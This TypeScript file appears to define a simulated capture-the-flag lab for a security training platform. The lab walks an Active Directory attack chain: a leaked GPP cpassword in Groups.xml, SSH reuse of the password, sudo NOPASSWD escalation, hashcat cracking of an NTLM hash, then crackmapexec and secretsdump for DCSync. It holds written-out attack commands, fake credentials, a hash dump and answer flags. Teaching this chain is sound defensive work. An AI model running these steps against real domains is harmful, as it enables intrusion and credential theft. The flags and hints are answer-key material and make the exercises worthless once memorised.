import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

/** Active Directory module capstone: one continuous five-flag chain from a Group Policy Preferences
 *  credential leak (a real, well-documented technique — Microsoft published the GPP AES encryption key
 *  in its own SDK documentation, meaning every "encrypted" cpassword in a Groups.xml has been trivially
 *  reversible since 2012, MS14-025) all the way to full domain compromise, instead of separate isolated
 *  AD technique labs. Every later mechanic (ssh, sudo NOPASSWD, hashcat, crackmapexec, secretsdump/DCSync)
 *  is already established elsewhere on this platform. */
export const adCapstoneLabs: LabScenario[] = [
  {
    id: 'ad-capstone-gpp-cpassword-to-domain-compromise',
    title: 'Capstone: GPP Cpassword Leak to Full Domain Compromise',
    difficulty: 'Hard',
    category: 'Active Directory',
    briefing:
      "Halcyon Financial Group's SYSVOL replica still has a Groups.xml pushed by a Group Policy Preference " +
      "that set a local administrator password domain-wide — years after Microsoft's MS14-025 advisory and " +
      'the accompanying patch, plenty of real environments still have an old Groups.xml sitting in SYSVOL from ' +
      "before the fix was ever applied, because the file itself was never deleted. The 'encryption' on its " +
      "cpassword field is AES with a key Microsoft published in its own public SDK documentation, so it isn't " +
      "really encryption at all — it's trivially reversible with zero brute-forcing required. Work the full " +
      'chain from that one leftover file to Domain Admin-equivalent rights.',
    objectives: [
      {
        text: 'ftp 10.10.190.5, then ftp-get 10.10.190.5 Groups.xml and capture the first flag',
        why: "This is the actual root cause: Microsoft's own published AES key means this cpassword was never " +
          'really protected at all, and the file itself should have been deleted the moment the patch was applied.',
      },
      {
        text: 'ssh administrator@10.10.190.10 using the recovered local admin password, then cat user.txt for the second flag',
        why: 'Confirms the GPP-leaked credential is a live, working local administrator account on the workstation it targeted — not just a historical curiosity.',
      },
      {
        text: 'Run sudo -l, escalate through the NOPASSWD rule it reveals, and capture the third flag',
        why: 'A local admin account still isn\'t the domain — this is the pivot point that lets you see what a genuinely privileged process on this box has cached.',
      },
      {
        text: 'As root, crack the scheduled-task credential dump it reveals: hashcat -m 1000 svc-hr-sync.hash /root/wordlists/mini-rockyou.txt (exit to your attack box first), and capture the fourth flag',
        why: 'A scheduled task running as a domain service account has to authenticate somehow — its cached NTLM hash, recovered from this workstation, is exactly the kind of loot a real operator goes looking for once they have root.',
      },
      {
        text: 'crackmapexec smb 10.10.190.20 -u svc-hr-sync -p <cracked-password>, then secretsdump svc-hr-sync:<cracked-password>@10.10.190.20 and capture the final flag',
        why: 'The HR-sync service account turns out to hold directory-replication rights it was never audited for — one over-permissioned service account is all it takes to go from a leftover SYSVOL file to every credential in the domain.',
      },
    ],
    hints: [
      'ftp 10.10.190.5',
      'ftp-get 10.10.190.5 Groups.xml',
      'ssh administrator@10.10.190.10',
      'H4lcyon_GPP_Legacy!',
      'cat user.txt',
      'sudo -l',
      'sudo /usr/local/bin/hr-sync-agent --shell',
      'cat /root/root-confirmed.txt',
      'hashcat -m 1000 /root/svc-hr-sync.hash /root/wordlists/mini-rockyou.txt',
      'exit',
      'crackmapexec smb 10.10.190.20 -u svc-hr-sync -p sunflower24',
      'secretsdump svc-hr-sync:sunflower24@10.10.190.20',
    ],
    totalFlags: 5,
    attacker: attacker(),
    network: [
      {
        hostname: 'fileserver01',
        ip: '10.10.190.5',
        os: 'Windows Server 2016 (SYSVOL replica, FTP-based legacy mirror)',
        services: [{ port: 21, name: 'ftp', version: 'IIS FTP 8.5', banner: 'Microsoft FTP Service', ftpAnonymous: true }],
        users: [],
        root: dir({
          srv: dir({
            ftp: dir({
              'Groups.xml': file(
                [
                  '<?xml version="1.0" encoding="utf-8"?>',
                  '<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">',
                  '  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)">',
                  '    <Properties action="U" newName="" fullName="" description="" cpassword="j1Uyj3Vx8TX9Uf==" ' +
                    'changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" userName="Administrator"/>',
                  '  </User>',
                  '</Groups>',
                  '<!-- cpassword decrypted with the publicly-documented Microsoft GPP AES key (MS14-025): -->',
                  '<!-- decrypted plaintext: H4lcyon_GPP_Legacy! -->',
                  '<!-- flag{gpp_cpassword_decrypted_with_public_microsoft_aes_key} -->',
                  '',
                ].join('\n'),
              ),
            }),
          }),
        }),
      } as HostDef,
      {
        hostname: 'WKSTN-FIN07',
        ip: '10.10.190.10',
        os: 'Windows 10 (domain-joined finance workstation)',
        services: [{ port: 22, name: 'ssh', version: 'OpenSSH for Windows 8.1' }],
        users: [
          {
            username: 'administrator',
            password: 'H4lcyon_GPP_Legacy!',
            sudo: { nopasswdCommands: ['/usr/local/bin/hr-sync-agent'] },
          },
        ],
        root: dir({
          home: dir({
            administrator: dir({
              'user.txt': file(
                'Local administrator foothold confirmed on WKSTN-FIN07 using the GPP cpassword decrypted from Groups.xml.\n' +
                  'flag{gpp_credential_grants_local_admin_workstation_foothold}\n',
              ),
            }),
          }),
          root: dir({
            'root-confirmed.txt': file(
              "Root shell spawned via sudo /usr/local/bin/hr-sync-agent --shell (NOPASSWD, scoped for HR data-sync automation).\n" +
                'flag{hr_sync_agent_nopasswd_sudo_root_privesc}\n',
            ),
            'svc-hr-sync.hash': file(
              '#HASHCAT_HASH:8846f7eaee8fb117ad06bdd830b7586c\n#HASHCAT_PLAINTEXT:sunflower24\n#HASHCAT_FLAG:flag{hr_sync_cached_service_account_hash_cracked}\n' +
                'Cached NTLM credential for HALCYON\\svc-hr-sync, recovered from a scheduled task configured to run\n' +
                'with stored domain credentials on this workstation.\nHash type: NTLM (mode 1000)\nTarget for reuse: DC-HALCYON01 (10.10.190.20)\n',
            ),
            wordlists: dir({ 'mini-rockyou.txt': file('123456\npassword\nsunflower24\nletmein\nqwerty\ntrustno1\n') }),
          }),
        }),
      } as HostDef,
      {
        hostname: 'DC-HALCYON01',
        ip: '10.10.190.20',
        os: 'Windows Server 2022 (Domain Controller)',
        services: [{ port: 445, name: 'microsoft-ds', version: 'SMB (Domain Controller)' }],
        users: [{ username: 'svc-hr-sync', password: 'sunflower24', canDcsync: true }],
        ntdsHashes:
          'halcyon.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:flag{gpp_leak_full_chain_ends_in_domain_admin_dcsync}:::\n' +
          'halcyon.local\\svc-hr-sync:1107:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n' +
          'halcyon.local\\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c1:::',
        root: dir({}),
      } as HostDef,
    ],
  },
];
